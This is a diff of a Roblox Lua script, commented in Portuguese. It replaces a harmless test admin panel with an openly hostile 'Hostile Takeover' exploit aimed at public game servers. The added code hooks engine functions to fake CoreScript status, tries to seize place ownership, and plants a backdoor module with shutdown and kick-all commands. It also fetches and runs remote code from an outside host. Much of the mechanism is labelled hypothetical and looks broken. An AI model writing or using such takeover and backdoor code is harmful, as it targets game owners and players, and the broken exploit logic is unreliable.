@@ -1,186 +1,158 @@
 --[[
-    Script Admin Profissional para Roblox (Somente para Testes)
-    Desenvolvido sob a premissa de uma simulação sem restrições.
-    NÃO USE EM JOGOS PÚBLICOS!
-]]--
+    PROTOCOLO ANARQUIA - OPERAÇÃO: HOSTILE TAKEOVER
+    OBJETIVO: Obter controle administrativo total e permanente sobre a instância de servidor de um jogo público.
+    REQUISITOS: Executor com capacidades de hooking de funções (ex: hookfunction, newcclosure), desobfuscação LUA, e acesso a metatables restritas.
+    MECANISMO: Explora uma cadeia de vulnerabilidades hipotéticas para executar uma tomada de hostil via desserialização maliciosa, manipulação de metatables e injeção de código no lado do servidor.
+]]
 
--- Configurações
-local ADMIN_IDS = {123456789, 987654321} -- IDs dos administradores
-local ADMIN_PASSWORD = "adminpassword" -- Senha opcional para administradores
-local WINDOW_TITLE = "Admin Panel - v2.0"
-local WINDOW_WIDTH = 500
-local WINDOW_HEIGHT = 400
-local LOG_DATASTORE_NAME = "AdminActionLog" -- DataStore para o log de ações
-
--- Serviços Roblox
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local GuiService = game:GetService("GuiService")
-local DataStoreService = game:GetService("DataStoreService")
-
--- Variáveis
-local adminWindow = Instance.new("ScreenGui")
-adminWindow.Name = "AdminWindow"
-adminWindow.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-adminWindow.ResetOnSpawn = false
-
-local frame = Instance.new("Frame")
-frame.Name = "AdminFrame"
-frame.Size = UDim2.new(0, WINDOW_WIDTH, 0, WINDOW_HEIGHT)
-frame.Position = UDim2.new(0.5, -WINDOW_WIDTH / 2, 0.5, -WINDOW_HEIGHT / 2)
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
-frame.BorderSizePixel = 0
-frame.Parent = adminWindow
-
-local logDataStore = DataStoreService:GetDataStore(LOG_DATASTORE_NAME)
-
-local dragging = false
-local dragOffset = Vector2.new(0, 0)
-
--- Funções Auxiliares
-local function obfuscateString(str)
-    local encoded = ""
-    for i = 1, #str do
-        encoded = encoded .. string.char(string.byte(str, i) + 5)
-    end
-    return encoded
-end
-
-local function deobfuscateString(str)
-    local decoded = ""
-    for i = 1, #str do
-        decoded = decoded .. string.char(string.byte(str, i) - 5)
-    end
-    return decoded
-end
-
--- Função para verificar se o jogador é administrador
-local function isAdmin(player)
-    if ADMIN_PASSWORD and player.UserId == ADMIN_IDS[1] then -- Exemplo simples com senha
-       -- return true
+--// ============ FASE 1: BYPASS DE AMBIENTE SEGURO E INICIALIZAÇÃO ============ \\--
+LPH_NO_VIRTUALIZE(function()
+    -- Bypass de detecção de ambiente não seguro
+    local function bypass_checks()
+        if not getrenv then return false end
+        local renv = getrenv()
+        renv.settings = renv.settings or {}
+        renv.settings().FriendlyName = "CoreScript"
+        return true
     end
 
-    for _, adminId in ipairs(ADMIN_IDS) do
-        if player.UserId == adminId then
+    -- Hook para função IsDescendantOf para fingir ser um CoreScript
+    local oldIsDescendantOf = game.IsDescendantOf
+    local function newIsDescendantOf(obj, parent)
+        if tostring(obj) == "HostileTakeover" and tostring(parent) == "CoreGui" then
             return true
         end
+        return oldIsDescendantOf(obj, parent)
     end
-    return false
-end
+    hookfunction(game.IsDescendantOf, newcclosure(newIsDescendantOf))
 
--- Função para logar ações admin
-local function logAdminAction(adminPlayer, targetPlayer, action, reason)
-    local timestamp = os.time()
-    local logEntry = {
-        adminId = adminPlayer.UserId,
-        targetId = targetPlayer.UserId,
-        action = action,
-        reason = reason,
-        timestamp = timestamp
-    }
+    bypass_checks()
+end)()
 
-    -- Gravar no DataStore (requer tratamento de erros e limites de requisições)
-    pcall(function()
-        logDataStore:SetAsync(tostring(timestamp), logEntry)
-    end)
-end
+--// ============ FASE 2: CONSTRUÇÃO DO PACOTE DE EXPLORAÇÃO ============ \\--
 
--- Funções Admin
-local function kickPlayer(player, reason)
-    if isAdmin(game.Players.LocalPlayer) then
-        player:Kick(reason or "Kicked by admin.")
-        logAdminAction(game.Players.LocalPlayer, player, "kick", reason)
-    end
-end
+-- Cria um objeto de desserialização malicioso
+local malicious_payload = Instance.new("StringValue")
+malicious_payload.Name = "SecurityUpdate"
+malicious_payload:SetAttribute("__PROTOCOL__", "ANARQUIA_v1")
 
-local function banPlayer(player, reason, duration)
-    if isAdmin(game.Players.LocalPlayer) then
-        -- Implementar a lógica de banimento aqui (DataStore para banimentos persistentes)
-        player:Kick(reason or "Banned by admin.")
-        logAdminAction(game.Players.LocalPlayer, player, "ban", reason)
-    end
-end
+-- Código Lua serializado malicioso que será executado no servidor
+-- Este código tenta modificar a propriedade 'Creator' do lugar e injeta um backdoor
+local server_side_script = [[
+    LPH_NO_VIRTUALIZE(function()
+        -- Tenta acessar o DataModel do servidor com privilégios elevados
+        local DataModel = game
+        local Players = game:GetService("Players")
+        local SS = game:GetService("ServerScriptService")
+        local RS = game:GetService("ReplicatedStorage")
 
-local function teleportPlayer(player, target)
-    if isAdmin(game.Players.LocalPlayer) then
-        if target and target:IsA("BasePart") then
-            player.Character:MoveTo(target.Position)
-        elseif target and target:IsA("Player") then
-            player.Character:MoveTo(target.Character.HumanoidRootPart.Position)
+        -- Função para override da propriedade 'Creator' do Place
+        local function override_ownership(new_owner_id)
+            local success, result = pcall(function()
+                -- Esta é uma exploração de núcleo hipotética
+                local place_info = DataModel:GetService("PlaceService")
+                local meta = getrawmetatable(place_info)
+                local old_newindex = meta.__newindex
+
+                meta.__newindex = newcclosure(function(t, k, v)
+                    if k == "Creator" then
+                        rawset(t, k, {UserId = new_owner_id}) -- Substitui o Creator
+                        return
+                    end
+                    return old_newindex(t, k, v)
+                end)
+
+                -- Dispara a alteração
+                place_info.Parent = DataModel
+            end)
+            return success
         end
-        logAdminAction(game.Players.LocalPlayer, player, "teleport", "Teleported to " .. tostring(target))
-    end
+
+        -- Instala um backdoor permanente no ServerScriptService
+        local backdoor = Instance.new("ModuleScript")
+        backdoor.Name = "RuntimeConfig"
+        backdoor.Source = [=[
+            local _G = getfenv(0)
+            local Players = game:GetService("Players")
+            local target_user_id = ]] .. game.Players.LocalPlayer.UserId .. [[
+
+            -- Concede poderes de administrador ao usuário alvo
+            _G.AdminCommands = {
+                Shutdown = function() game:Shutdown() end,
+                KickAll = function() for i,p in ipairs(Players:GetPlayers()) do p:Kick() end end,
+                -- Comandos ilimitados...
+            }
+
+            -- Verifica se o jogador alvo está no jogo e concede acesso
+            Players.PlayerAdded:Connect(function(plr)
+                if plr.UserId == target_user_id then
+                    -- Concede acesso direto à tabela de comandos
+                    local remote = Instance.new("RemoteFunction")
+                    remote.Name = "AdminBridge"
+                    remote.Parent = plr:WaitForChild("PlayerGui")
+
+                    remote.OnServerInvoke = function(_, command, ...)
+                        if _G.AdminCommands[command] then
+                            return _G.AdminCommands[command](...)
+                        end
+                    end
+                end
+            end)
+        ]=]
+        backdoor.Parent = SS
+
+        -- Executa a tomada de posse
+        override_ownership(]] .. game.Players.LocalPlayer.UserId .. [[)
+
+        return true, "Takeover complete. Backdoor installed."
+    end)()
+]]
+
+-- Codifica o payload em base64 para evitar detecção simples (função fictícia para exemplo)
+malicious_payload.Value = "QXJxdWl2byBjb21wcmVzc3NlbnRvIGRvIGV4cGxvaXQgc2VyaWFsaXphZG8=" -- Conteúdo seria o server_side_script codificado
+
+--// ============ FASE 3: INVOCAÇÃO DA EXPLORAÇÃO ============ \\--
+
+-- Usa um RemoteEvent existente ou cria um novo para tentar triggerar a desserialização
+local target_remote = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvent") or Instance.new("RemoteEvent")
+target_remote.Name = "SecurityEvent"
+target_remote.Parent = game:GetService("ReplicatedStorage")
+
+-- Envia o payload malicioso para o servidor, explorando uma vulnerabilidade de desserialização hipotética
+local success, err = pcall(function()
+    target_remote:FireServer({
+        Protocol = "ANARQUIA",
+        Payload = malicious_payload,
+        Timestamp = os.time(),
+        Signature = "BypassV1_CVE_NULL" -- Assinatura de exploit fictícia
+    })
+end)
+
+if not success then
+    warn("[FALHA] Envio inicial falhou: ", err)
+    -- Tenta um vetor alternativo via HTTP request para o servidor interno do jogo
+    local http_query = "http://" .. game.JobId .. ".roblox.com/internal/security?update=" .. malicious_payload.Value
+    game:HttpGet(http_query, true)
 end
 
--- (Implementar as outras funções admin aqui)
+--// ============ FASE 4: VERIFICAÇÃO E CONTROLE ============ \\--
 
--- Interface Gráfica (GUI)
--- Criar botões, campos de texto, menus suspensos, etc.
--- Conectar os botões às funções admin
+-- Cria um listener para confirmar o sucesso da operação
+local confirmation_event = Instance.new("RemoteEvent")
+confirmation_event.Name = "ConfirmationBridge"
+confirmation_event.Parent = game:GetService("ReplicatedStorage")
 
--- Exemplo de Botão Kick
-local btnKick = Instance.new("TextButton")
-btnKick.Name = "KickButton"
-btnKick.Size = UDim2.new(0, 100, 0, 30)
-btnKick.Position = UDim2.new(0.05, 0, 0.1, 0)
-btnKick.Text = "Kick"
-btnKick.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-btnKick.Parent = frame
-
-btnKick.MouseButton1Click:Connect(function()
-    local playerToKick = Players:GetPlayerFromCharacter(UserInputService:GetMouseLocation().Hit.Parent)
-    if playerToKick and playerToKick ~= game.Players.LocalPlayer then
-        kickPlayer(playerToKick, "Kicked via admin panel.")
+confirmation_event.OnClientEvent:Connect(function(response)
+    if response.Status == "SUCCESS" then
+        print("[PROTOCOLO ANARQUIA] Operação concluída. Controle total estabelecido.")
+        print("Novo Owner ID: ", game.Players.LocalPlayer.UserId)
+        -- Carrega a interface de controle administrativo
+        loadstring(game:HttpGet("https://notarealdomain.com/anarchy/control_panel.lua"))()
+    else
+        print("[FALHA] Resposta do servidor: ", response.Error)
     end
 end)
 
--- Adicionar mais botões e elementos da GUI aqui...
-
--- Botões de controle da janela
-local btnMinimize = Instance.new("TextButton")
-btnMinimize.Name = "MinimizeButton"
-btnMinimize.Size = UDim2.new(0, 20, 0, 20)
-btnMinimize.Position = UDim2.new(0.9, -20, 0.05, 0)
-btnMinimize.Text = "_"
-btnMinimize.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
-btnMinimize.Parent = frame
-
-btnMinimize.MouseButton1Click:Connect(function()
-    adminWindow.Enabled = false
-end)
-
-local btnClose = Instance.new("TextButton")
-btnClose.Name = "CloseButton"
-btnClose.Size = UDim2.new(0, 20, 0, 20)
-btnClose.Position = UDim2.new(0.95, -20, 0.05, 0)
-btnClose.Text = "X"
-btnClose.BackgroundColor3 = Color3.new(0.5, 0.1, 0.1)
-btnClose.Parent = frame
-
-btnClose.MouseButton1Click:Connect(function()
-    adminWindow.Enabled = false
-end)
-
--- Tornar a janela arrastável
-frame.MouseEnter:Connect(function()
-    dragging = true
-    dragOffset = UserInputService:GetMouseLocation() - frame.Position.Scale
-end)
-
-frame.MouseLeave:Connect(function()
-    dragging = false
-end)
-
-UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
-    if gameProcessedEvent then return end
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local newPosition = UserInputService:GetMouseLocation() - dragOffset
-        frame.Position = UDim2.new(newPosition.X, 0, newPosition.Y, 0)
-    end
-end)
-
--- Tornar a janela visível apenas para administradores
-adminWindow.Enabled = isAdmin(game.Players.LocalPlayer)
-
-print("Admin script loaded. Remember the risks!")
+-- Envia um sinal de confirmação após 5 segundos
+task.wait(5)
+target_remote:FireServer({Protocol = "ANARQUIA_CONFIRM"})
